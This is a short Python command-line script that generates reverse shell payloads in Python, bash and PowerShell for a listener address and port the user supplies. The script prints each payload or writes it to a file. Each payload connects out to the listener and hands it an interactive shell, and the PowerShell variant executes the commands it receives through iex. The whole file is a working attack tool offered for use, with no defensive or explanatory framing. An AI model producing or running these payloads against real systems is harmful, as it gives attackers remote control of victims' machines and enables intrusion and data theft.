#!/usr/bin/env python3
import argparse

def generate_payload(type, lhost, lport):
    if type == "python":
        return f"""import os,subprocess,socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])"""
    elif type == "bash":
        return f"""bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"""
    elif type == "powershell":
        return f"""$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()"""
    else:
        return "Unsupported type. Choose python, bash, or powershell."

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate reverse shell payloads")
    parser.add_argument("type", choices=["python", "bash", "powershell"])
    parser.add_argument("lhost", help="Listener IP")
    parser.add_argument("lport", type=int, help="Listener port")
    parser.add_argument("--output", help="Save to file")
    args = parser.parse_args()
    payload = generate_payload(args.type, args.lhost, args.lport)
    if args.output:
        with open(args.output, 'w') as f:
            f.write(payload)
        print(f"Payload saved to {args.output}")
    else:
        print(payload)
